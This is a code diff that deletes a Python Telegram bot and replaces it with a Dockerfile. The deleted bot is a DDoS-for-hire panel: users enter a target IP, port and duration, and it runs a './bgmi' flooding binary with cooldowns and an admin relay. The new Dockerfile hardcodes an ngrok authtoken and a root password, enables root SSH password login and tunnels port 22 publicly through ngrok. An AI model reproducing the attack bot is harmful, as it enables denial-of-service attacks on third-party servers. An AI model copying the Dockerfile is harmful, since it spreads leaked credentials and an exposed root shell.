@@ -1,169 +1,85 @@
-import os, time, threading, subprocess
-import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+FROM ubuntu:22.04
 
-# ================= CONFIG =================
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
+ENV DEBIAN_FRONTEND=noninteractive
+ENV TZ=Asia/Kolkata
 
-MAIN_ADMIN = "5436530930"
+ARG NGROK_AUTHTOKEN="37Wdac2DHYyaxjRP3SFQjgU9zNM_5BHCr6u2pgacG9aBHesc3"
+ARG ROOT_PASSWORD="FrxShooter"
 
-MAX_ATTACK = 300          # 5 minutes
-COOLDOWN = 1200           # 20 minutes
+# Install minimal tools and tzdata
+RUN apt-get update && \
+    apt-get install -y --no-install-recommends apt-utils ca-certificates gnupg2 curl wget lsb-release tzdata && \
+    ln -fs /usr/share/zoneinfo/${TZ} /etc/localtime && \
+    dpkg-reconfigure --frontend noninteractive tzdata && \
+    rm -rf /var/lib/apt/lists/*
 
-# ================= STATE =================
-running = {}              # user_id -> process
-cooldown = {}             # user_id -> last_end
-awaiting_attack = set()   # user waiting for IP PORT TIME
-admin_chat = set()        # user in admin chat
+# Install common utilities, SSH, and software-properties-common for add-apt-repository
+RUN apt-get update && \
+    apt-get install -y --no-install-recommends \
+      openssh-server \
+      wget \
+      curl \
+      git \
+      nano \
+      sudo \
+      software-properties-common \
+    && rm -rf /var/lib/apt/lists/*
 
-lock = threading.Lock()
+# Python 3.12
+RUN add-apt-repository ppa:deadsnakes/ppa -y && \
+    apt-get update && \
+    apt-get install -y --no-install-recommends python3.12 python3.12-venv && \
+    rm -rf /var/lib/apt/lists/*
 
-# ================= UI =================
-def main_menu(uid):
-    kb = InlineKeyboardMarkup(row_width=2)
-    kb.add(
-        InlineKeyboardButton("🚀 Attack", callback_data="attack"),
-        InlineKeyboardButton("📞 Contact Admin", callback_data="contact")
-    )
-    if uid in running or uid == MAIN_ADMIN:
-        kb.add(InlineKeyboardButton("🛑 Stop Attack", callback_data="stop"))
-    return kb
+# Make python3 point to python3.12
+RUN update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.12 1
 
-def admin_chat_menu():
-    kb = InlineKeyboardMarkup()
-    kb.add(InlineKeyboardButton("❌ End Admin Chat", callback_data="endchat"))
-    return kb
+# SSH root password
+RUN echo "root:${ROOT_PASSWORD}" | chpasswd \
+    && mkdir -p /var/run/sshd \
+    && sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config || true \
+    && sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config || true
 
-# ================= CALLBACKS =================
-@bot.callback_query_handler(func=lambda c: True)
-def cb(c):
-    uid = str(c.message.chat.id)
+# ngrok official repo
+RUN curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc | tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null \
+    && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | tee /etc/apt/sources.list.d/ngrok.list \
+    && apt-get update \
+    && apt-get install -y --no-install-recommends ngrok \
+    && rm -rf /var/lib/apt/lists/*
 
-    if c.data == "attack":
-        awaiting_attack.add(uid)
-        bot.edit_message_text(
-            "Please enter:\n<code>IP PORT SECONDS</code>\n\nExample:\n<code>1.1.1.1 80 120</code>",
-            uid,
-            c.message.message_id,
-            reply_markup=main_menu(uid)
-        )
+# Add ngrok token
+RUN if [ -n "${NGROK_AUTHTOKEN}" ]; then ngrok config add-authtoken "${NGROK_AUTHTOKEN}"; fi
 
-    elif c.data == "contact":
-        admin_chat.add(uid)
-        bot.edit_message_text(
-            "💬 Admin chat enabled\nType your message",
-            uid,
-            c.message.message_id,
-            reply_markup=admin_chat_menu()
-        )
+# Optional hostname file
+RUN echo "Dark" > /etc/hostname
 
-    elif c.data == "endchat":
-        admin_chat.discard(uid)
-        bot.edit_message_text(
-            "✅ Admin chat closed",
-            uid,
-            c.message.message_id,
-            reply_markup=main_menu(uid)
-        )
+# Force bash prompt
+RUN echo 'export PS1="root@Dark:\\w# "' >> /root/.bashrc
 
-    elif c.data == "stop":
-        stop_attack(uid)
-        bot.edit_message_text(
-            "🛑 Attack stopped\n⏳ Cooldown: 20 minutes",
-            uid,
-            c.message.message_id,
-            reply_markup=main_menu(uid)
-        )
+EXPOSE 22
 
-# ================= ADMIN CHAT RELAY =================
-@bot.message_handler(func=lambda m: str(m.chat.id) in admin_chat and str(m.chat.id) != MAIN_ADMIN)
-def user_to_admin(m):
-    bot.send_message(
-        MAIN_ADMIN,
-        f"👤 User {m.chat.id}:\n{m.text}"
-    )
+# Create a startup script that handles ngrok failures gracefully
+RUN echo '#!/bin/bash\n\
+# Start SSH daemon\n\
+/usr/sbin/sshd\n\
+\n\
+# Try to start ngrok, but if it fails, keep the container running with SSH only\n\
+echo "Starting ngrok..."\n\
+ngrok tcp 22 --log=stdout &\n\
+NGROK_PID=$!\n\
+\n\
+# Wait a bit to see if ngrok starts successfully\n\
+sleep 10\n\
+\n\
+# Check if ngrok process is still running\n\
+if ps -p $NGROK_PID > /dev/null; then\n\
+    echo "ngrok started successfully"\n\
+    wait $NGROK_PID\n\
+else\n\
+    echo "ngrok failed to start, but keeping container alive with SSH only"\n\
+    echo "You can manually troubleshoot ngrok issues"\n\
+    # Keep container running indefinitely\n\
+    tail -f /dev/null\n\
+fi' > /start.sh && chmod +x /start.sh
 
-@bot.message_handler(func=lambda m: str(m.chat.id) == MAIN_ADMIN and m.reply_to_message)
-def admin_to_user(m):
-    try:
-        uid = m.reply_to_message.text.split()[2].strip(":")
-        bot.send_message(uid, m.text)
-    except:
-        pass
-
-# ================= ATTACK CORE =================
-def stop_attack(uid):
-    with lock:
-        p = running.pop(uid, None)
-        if p:
-            try: p.terminate()
-            except: pass
-        cooldown[uid] = time.time()
-
-@bot.message_handler(func=lambda m: str(m.chat.id) in awaiting_attack)
-def receive_attack_params(m):
-    uid = str(m.chat.id)
-    awaiting_attack.discard(uid)
-
-    # cooldown check (not for admin)
-    if uid != MAIN_ADMIN:
-        last = cooldown.get(uid)
-        if last and time.time() - last < COOLDOWN:
-            bot.send_message(
-                uid,
-                "You can do your next attack after 20 minutes",
-                reply_markup=main_menu(uid)
-            )
-            return
-
-    try:
-        ip, port, sec = m.text.split()
-        sec = int(sec)
-        if sec > MAX_ATTACK:
-            raise ValueError
-    except:
-        bot.send_message(uid, "Invalid format", reply_markup=main_menu(uid))
-        return
-
-    # start attack
-    p = subprocess.Popen(["./bgmi", ip, port, str(sec)])
-    with lock:
-        running[uid] = p
-
-    bot.send_message(
-        uid,
-        f"✅ Attack Started\nTarget: {ip}\nTime: {sec}s",
-        reply_markup=main_menu(uid)
-    )
-
-    def wait_done():
-        p.wait()
-        with lock:
-            running.pop(uid, None)
-            cooldown[uid] = time.time()
-        bot.send_message(
-            uid,
-            "✅ Attack completed\n⏳ Cooldown: 20 minutes",
-            reply_markup=main_menu(uid)
-        )
-
-    threading.Thread(target=wait_done, daemon=True).start()
-
-# ================= START =================
-@bot.message_handler(commands=["start"])
-def start(m):
-    uid = str(m.chat.id)
-    bot.send_message(
-        uid,
-        "👋 Welcome\nChoose an option",
-        reply_markup=main_menu(uid)
-    )
-
-# ================= RUN =================
-while True:
-    try:
-        bot.polling(none_stop=True)
-    except Exception as e:
-        print(e)
-        time.sleep(3)
+CMD ["/start.sh"]
